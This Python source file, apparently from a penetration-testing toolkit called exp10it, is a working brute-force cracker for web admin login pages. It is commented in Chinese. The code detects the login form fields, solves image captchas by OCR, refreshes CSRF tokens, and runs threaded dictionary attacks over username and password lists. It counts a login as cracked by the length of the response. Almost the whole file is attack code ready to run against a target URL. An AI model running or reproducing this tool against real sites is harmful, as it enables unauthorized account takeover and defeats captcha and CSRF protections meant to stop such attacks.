import time
from exp10it import figlet2file
figlet2file("3xp10it",0,True)
time.sleep(1)

import os
import re
import sys
from concurrent import futures
os.system("pip3 install exp10it -U --no-cache")
from exp10it import CLIOutput
from exp10it import get_request
from exp10it import get_value_from_url
from exp10it import get_user_and_pass_form_from_html
from exp10it import get_yanzhengma_form_and_src_from_url
from exp10it import get_string_from_url_or_picfile
from exp10it import ModulePath
from exp10it import get_remain_time
from exp10it import get_http_domain_from_url
from exp10it import get_url_has_csrf_token
from exp10it import get_param_part_from_content

def get_csrf_token_value_from_html(html):
    html=re.sub(r"<!--.*-->","",html)
    param_part=get_param_part_from_content(html)
    find_csrf_token=re.search(r"([^&?]*token[^=]*)=([^&]+)",param_part,re.I)
    csrf_token_value=""
    if find_csrf_token:
        csrf_token_value=find_csrf_token.group(2)
    return csrf_token_value



def crack_admin_login_url(
        url,
        user_dict_file=ModulePath + "dicts/user.txt",
        pass_dict_file=ModulePath + "dicts/pass.txt",
        yanzhengma_len=0):
    # 这里的yanzhengma_len是要求的验证码长度,默认不设置,自动获得,根据不同情况人为设置不同值效果更好
    # 爆破管理员后台登录url,尝试自动识别验证码,如果管理员登录页面没有验证码,加了任意验证码数据也可通过验证
    import requests
    figlet2file("cracking admin login url", 0, True)
    print("cracking admin login url:%s" % url)
    print("正在使用吃奶的劲爆破登录页面...")

    def crack_admin_login_url_thread(url,username,password):
        if get_flag[0] == 1:
            return


        try_time[0] += 1
        if requestAction=="GET":
            final_request_url=form_action_url
            final_request_url=re.sub(r"%s=[^&]*" % user_form_name,"%s=%s" %
                    (user_form_name,username),final_request_url)
            final_request_url=re.sub(r"%s=[^&]*" % pass_form_name,"%s=%s" %
                    (pass_form_name,password),final_request_url)
            if has_yanzhengma[0]:
                if needOnlyGetOneYanZhengMa:
                    yanzhengmaValue=onlyOneYanZhengMaValue
                else:
                    yanzhengmaValue=get_one_valid_yangzhengma_from_src(yanzhengma_src)

                final_request_url=re.sub(r"%s=[^&]*" % yanzhengma_form_name,"%s=%s" %
                        (yanzhengma_form_name,yanzhengmaValue),final_request_url)
                if hasCsrfToken:
                    final_request_url=re.sub(r"%s=[^&]*" % csrfTokenName,currentCsrfTokenPart[0],final_request_url)

            html=s.get(final_request_url).text

            if hasCsrfToken:
                csrfTokenValue=get_csrf_token_value_from_html(html)
                currentCsrfTokenPart[0]=csrfTokenPart+csrfTokenValue
        else:
            #post request
            paramPartValue=form_action_url.split("^")[1]
            paramList=paramPartValue.split("&")
            values={}
            for eachP in paramList:
                eachPList=eachP.split("=")
                eachparamName=eachPList[0]
                eachparamValue=eachPList[1]
                if eachparamName==user_form_name:
                    eachparamValue=username
                if eachparamName==pass_form_name:
                    eachparamValue=password
                values[eachparamName]=eachparamValue

            if has_yanzhengma[0]:
                if not needOnlyGetOneYanZhengMa:
                    values[yanzhengma_form_name]=get_one_valid_yangzhengma_from_src(yanzhengma_src)
                else:
                    values[yanzhengma_form_name]=onlyOneYanZhengMaValue

            if hasCsrfToken:
                values[csrfTokenName]=re.search(r"[^=]+=(.*)",currentCsrfTokenPart[0]).group(1)

            html = s.post(form_action_url.split("^")[0], values).text

            if hasCsrfToken:
                csrfTokenValue=get_csrf_token_value_from_html(html)
                currentCsrfTokenPart[0]=csrfTokenPart+csrfTokenValue

        USERNAME_PASSWORD = "(" + username + ":" + \
                password + ")" + (52 - len(password)) * " "
        # 每100次计算完成任务的平均速度

        left_time = get_remain_time(
                start[0],
                biaoji_time[0],
                remain_time[0],
                100,
                try_time[0],
                sum[0])
        remain_time[0] = left_time

        sys.stdout.write('-' * (try_time[0] * 100 // sum[0]) + '>' + str(try_time[0] * 100 // sum[0]) +
                '%' + ' %s/%s  remain time:%s  %s\r' % (try_time[0], sum[0], remain_time[0], USERNAME_PASSWORD))

        sys.stdout.flush()


        if len(html) > logined_least_length:
            # 认为登录成功
            get_flag[0] = 1
            end = time.time()
            CLIOutput().good_print(
                    "congratulations!!! admin login url cracked succeed!!!", "red")
            string = "cracked admin login url:%s username and password:(%s:%s)" % (
                    url, username, password)
            CLIOutput().good_print(string, "red")
            return_string[0]=string
            print("you spend time:" + str(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            table_name_list = get_target_table_name_list(http_domain_value)
            urls_table_name = http_domain_value.split(
                    "/")[-1].replace(".", "_") + "_urls"

            return {'username': username, 'password': password}

    def crack_admin_login_url_inside_func(url, username, pass_dict_file):
        # urls和usernames是相同内容的列表
        urls = []
        usernames = []
        # passwords是pass_dict_file文件对应的所有密码的集合的列表
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            usernames.append(username)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = usernames_num * i
        if needOnlyGetOneYanZhengMa or hasCsrfToken:
            max_workers=1
        else:
            max_workers=20
        with futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(crack_admin_login_url_thread, urls, usernames, passwords)


    def get_one_valid_yangzhengma_from_src(yanzhengmaUrl):
        # 这里不用exp10it模块中打包好的get_request和post_request来发送request请求,因为要保留session在服务器需要
        #yanzhengma = get_string_from_url_or_picfile(yanzhengma_src)
        while 1:
            import shutil
            response = s.get(yanzhengmaUrl, stream=True)
            with open('img.png', 'wb') as out_file:
                shutil.copyfileobj(response.raw, out_file)
            del response
            yanzhengma = get_string_from_url_or_picfile("img.png")
            os.system("rm img.png")

            time.sleep(3)
            if re.search(r"[^a-zA-Z0-9]+", yanzhengma):
                # time.sleep(3)
                continue
            elif re.search(r"\s", yanzhengma):
                continue
            elif yanzhengma == "":
                continue
            else:
                if yanzhengma_len != 0:
                    if len(yanzhengma) != yanzhengma_len:
                        continue
                # print(yanzhengma)
                # print(len(yanzhengma))
                break
        return yanzhengma


    a=get_request(url,by="seleniumPhantomJS")
    get_result = get_user_and_pass_form_from_html(a['content'])
    user_form_name = get_result['user_form_name']
    pass_form_name = get_result['pass_form_name']
    if user_form_name is None:
        print("user_form_name is None")
        return
    if pass_form_name is None:
        print("pass_form_name is None")
        return
    form_action_url = a['formActionValue']
    #default request action=post
    requestAction="POST"
    if a['hasFormAction']:
        if "^" not in a['formActionValue']:
            requestAction="GET"
    else:
        print("url is not a admin login url entry")
        return

    get_flag = [0]
    return_string=[""]
    try_time = [0]
    sum = [0]
    start = [0]

    # 用来标记当前时间的"相对函数全局"变量
    biaoji_time = [0]
    # 用来标记当前剩余完成时间的"相对函数全局"变量
    tmp = time.time()
    remain_time = [tmp - tmp]
    # current_username_password={}

    has_yanzhengma = [False]
    find_yanzhengma = get_yanzhengma_form_and_src_from_url(url)
    if find_yanzhengma:
        yanzhengma_form_name = find_yanzhengma['yanzhengma_form_name']
        yanzhengma_src = find_yanzhengma['yanzhengma_src']
        has_yanzhengma = [True]

    hasCsrfToken=False
    forCsrfToken=get_url_has_csrf_token(url)
    if forCsrfToken['hasCsrfToken']:
        hasCsrfToken=True
        csrfTokenName=forCsrfToken['csrfTokenName']
        csrfTokenPart=csrfTokenName+"="
        currentCsrfTokenPart=[""]

    s = requests.session()
    # sesssion start place
    sessionStart=s.get(url)
    unlogin_length = len(sessionStart.text)
    # 如果post数据后返回数据长度超过未登录时的0.5倍则认为是登录成功
    logined_least_length = unlogin_length + unlogin_length / 2

    if hasCsrfToken:
        csrf_token_value=get_csrf_token_value_from_html(sessionStart.text)
        currentCsrfTokenPart=[csrfTokenPart+csrf_token_value]

    needOnlyGetOneYanZhengMa=False
    if has_yanzhengma[0]:
        if "^" in form_action_url:
            #post request
            print(get_value_from_url(form_action_url.split("^")[0])['y1'])
            if get_value_from_url(form_action_url.split("^")[0])['y1']!=get_value_from_url(a['currentUrl'])['y1']:
                # should update yanzhengma everytime
                needOnlyGetOneYanZhengMa=True
        else:
            #get request
            if get_value_from_url(form_action_url)['y1']!=get_value_from_url(a['currentUrl'])['y1']:
                needOnlyGetOneYanZhengMa=True
        if needOnlyGetOneYanZhengMa:
            print("Congratulation! Target login url need only one yanzhengma!!")

            import shutil
            response = s.get(yanzhengma_src, stream=True)
            with open('img.png', 'wb') as out_file:
                shutil.copyfileobj(response.raw, out_file)
            del response
            onlyOneYanZhengMaValue= input("Please open img.png and input the yanzhengma string:>")
            #get_string_from_url_or_picfile("img.png")
            os.system("rm img.png")


    with open(r"%s" % user_dict_file, "r+") as user_file:
        all_users = user_file.readlines()
        usernames_num = len(all_users)
        start[0] = time.time()
        for username in all_users:
            # 曾经双层多线程,没能跑完所有的组合,于是不再这里再开多线程
            username = re.sub(r'(\s)$', '', username)
            crack_admin_login_url_inside_func(a['currentUrl'], username, pass_dict_file)

    return return_string[0]

if __name__ == '__main__':
    import sys
    url = sys.argv[1]
    # 下面加4是因为http://localhost/admin.php中验证码为4,在不确定验证码长度情况下下面第二个参数不用写
    # crack_admin_login_url(url,yanzhengma_len=4)
    crack_admin_login_url(url)
